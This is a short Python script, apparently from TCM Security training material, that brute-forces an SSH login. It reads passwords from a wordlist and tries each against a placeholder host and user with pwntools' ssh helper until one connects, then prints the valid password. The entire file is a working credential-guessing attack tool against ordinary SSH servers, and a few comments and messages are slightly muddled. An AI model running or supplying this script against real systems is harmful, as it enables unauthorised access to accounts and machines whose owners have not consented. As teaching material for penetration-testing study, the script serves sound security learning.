from pwn import *
import paramiko #for establishinb connection with ssh

host_name = 'IP_ADDRESS'
user_name = 'HOSTNAME'
no_of_attempts = 0

#Download/Create a password file 
with open("password.txt", "r") as pass_list:
	for password in pass_list:
		password = password.strip("\n")
		try:
			print("[{}] Attempting password '{}'".format(no_of_attempts,password))
#ssh is inbuilt module from pwn 
			response = ssh(host = host_name, user = user_name, password = password, timeout = 1)
			if response.connected():
				print("[#] Valid password found '{}'".format(password))
				response.close()
				break
			response.close()
#for exception handling
		except paramiko.ssh_exception.AuthenticationException:
			print("[X] Invalid format !! Try again")
		no_of_attempts += 1

#Credit: TCM Security
